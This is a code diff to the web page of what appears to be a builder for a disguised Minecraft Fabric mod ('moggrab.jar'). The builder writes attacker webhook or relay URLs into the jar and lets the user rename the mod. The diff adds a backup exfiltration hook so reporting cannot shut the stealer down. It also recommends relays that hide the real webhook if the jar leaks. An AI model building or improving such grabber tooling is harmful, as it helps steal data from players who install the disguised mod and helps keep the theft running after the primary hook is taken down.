@@ -326,6 +326,7 @@
           <span class="chip">v1.0.0</span>
           <span class="chip">fabric loader 0.12+</span>
           <span class="chip">mc 1.18 &rarr; 1.21</span>
+          <span class="chip">dual-hook</span>
         </div>
         <p class="big">Drop a hook.<br />Get the <em>jar.</em></p>
         <p class="tag">Paste a webhook or relay URL, hit build — the mod reads
@@ -346,7 +347,11 @@
     <!-- BUILD -->
     <section class="panel active" role="tabpanel" id="panel-build">
       <input id="wh" type="text" spellcheck="false" autocomplete="off"
-             placeholder="https://your-relay.workers.dev — or your Discord hook">
+             placeholder="Primary hook — relay URL or Discord webhook">
+      <input id="wh2" type="text" spellcheck="false" autocomplete="off"
+             placeholder="Backup hook (optional)">
+      <p class="hint">Dual-hook it: drop in two URLs and the mod posts to both — the
+        backup stays hot even if the primary gets nuked.</p>
 
       <details class="custom" id="custom">
         <summary>Customize name &amp; details</summary>
@@ -389,7 +394,8 @@
           (<code class="inline">discord.com/api/webhooks/...</code>) or, safer,
           a Cloudflare relay URL (<code class="inline">…workers.dev</code>).
           With a relay, your real webhook never ends up inside the jar — no one
-          can spam it or delete it remotely even if the jar leaks.
+          can spam it or delete it remotely even if the jar leaks. The Build tab
+          takes two URLs: give it a relay plus a backup hook and it posts to both.
         </li>
         <li>
           <strong>Go to the Build tab</strong>, paste the hook URL into the box,
@@ -449,8 +455,8 @@
               <strong>Save and deploy</strong>. Your hook is already baked in —
               nothing else to configure.</li>
             <li><strong>Grab the URL</strong> — the worker's address is shown at the
-              top of its page. Paste that into the Build tab instead of the raw
-              Discord hook.</li>
+              top of its page. Use it as the primary in the Build tab, with your raw
+              Discord hook as the backup — the mod posts to both.</li>
           </ol>
           <p class="hint">The worker supports an optional
             <code class="inline">HOOK_SECRET</code> + <code class="inline">X-Hook-Secret</code>
@@ -567,7 +573,7 @@
 
   async function loadTemplate() {
     try {
-      const res = await fetch('assets/moggrab.jar?v=3');
+      const res = await fetch('assets/moggrab.jar?v=4');
       if (!res.ok) throw new Error('jar fetch ' + res.status);
       template = await res.arrayBuffer();
       btn.disabled = false;
@@ -581,11 +587,17 @@
 
   btn.addEventListener('click', async () => {
     const url = wh.value.trim();
+    const url2 = wh2.value.trim();
     status.className = '';
     dl.style.display = 'none';
 
     if (!/^https:\/\/[^\s/]+\/[^\s]*$/.test(url) || url.length > 300) {
       status.textContent = 'Needs a real HTTPS hook URL (Discord or your relay).';
+      status.className = 'err';
+      return;
+    }
+    if (url2 && (!/^https:\/\/[^\s/]+\/[^\s]*$/.test(url2) || url2.length > 300)) {
+      status.textContent = 'Backup hook needs a real HTTPS URL too — or leave it blank.';
       status.className = 'err';
       return;
     }
@@ -620,7 +632,7 @@
     try {
       const zip = await JSZip.loadAsync(template);
       // burn the hook + rewritten metadata in
-      zip.file('webhook.txt', url);
+      zip.file('webhook.txt', [url, url2].filter(Boolean).join('\n'));
       const meta = JSON.parse(await zip.file('fabric.mod.json').async('string'));
       meta.id = modId;
       meta.name = modName;
